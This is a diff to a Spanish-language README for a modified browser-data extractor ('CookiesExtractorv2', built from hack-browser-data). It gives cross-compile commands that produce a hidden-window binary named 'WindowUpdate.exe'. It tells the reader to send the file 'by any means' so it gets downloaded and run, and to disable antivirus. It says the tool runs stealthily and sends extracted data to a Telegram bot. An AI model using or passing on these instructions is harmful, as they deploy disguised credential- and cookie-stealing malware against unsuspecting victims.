@@ -108,21 +108,23 @@ go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe
 
 ```
 
-# Envia el .exe por cualquier medio descargalo y ejecutalo 
+### Envia el .exe por cualquier medio descargalo y ejecutalo 
 
-Nota: En algunas situaciones, esta herramienta de seguridad puede ser detectada como un virus por Windows Defender u otro software antivirus y no podrá ejecutarse. Es recomendable desactivar el antivirus temporalmente, como si instalaras cualquier programa "crackeado". El código es de código abierto, puedes modificarlo y compilarlo tú mismo. Ten en cuenta que esta versión modificada está diseñada para operar de forma sigilosa y enviar datos a un bot de Telegram, lo cual es la razón principal de tales detecciones.
+> Nota: En algunas situaciones, esta herramienta de seguridad puede ser detectada como un virus por Windows Defender u otro software antivirus y no podrá ejecutarse. Es recomendable desactivar el antivirus temporalmente, como si instalaras cualquier programa "crackeado". El código es de código abierto, puedes modificarlo y compilarlo tú mismo. Ten en cuenta que esta versión modificada está diseñada para operar de forma sigilosa y enviar datos a un bot de Telegram, lo cual es la razón principal de tales detecciones.
 
-
-Compilación cruzada (Cross compile)
+### Compilación cruzada (Cross compile)
 Aquí tienes un ejemplo de cómo usar macOS para compilar para Windows y Linux. Asegúrate de estar en la raíz de tu módulo (CookiesExtractorv2) cuando ejecutes estos comandos.
 
 Para Windows
+```bash
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe ./cmd/hack-browser-data
-
+```
 Para Linux
+```bash
 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o WindowUpdate ./cmd/hack-browser-data
+```
 
-Ejecución
-Importante: Esta versión de la herramienta está diseñada para ejecutarse de forma sigilosa en segundo plano. Los ejemplos de comandos que se muestran a continuación corresponden al comportamiento de la herramienta original para exportación local y para fines de depuración o prueba de sus capacidades de extracción, no a la operación normal de esta versión modificada.
+### Ejecución
+> Importante: Esta versión de la herramienta está diseñada para ejecutarse de forma sigilosa en segundo plano. Los ejemplos de comandos que se muestran a continuación corresponden al comportamiento de la herramienta original para exportación local y para fines de depuración o prueba de sus capacidades de extracción, no a la operación normal de esta versión modificada.
 
 
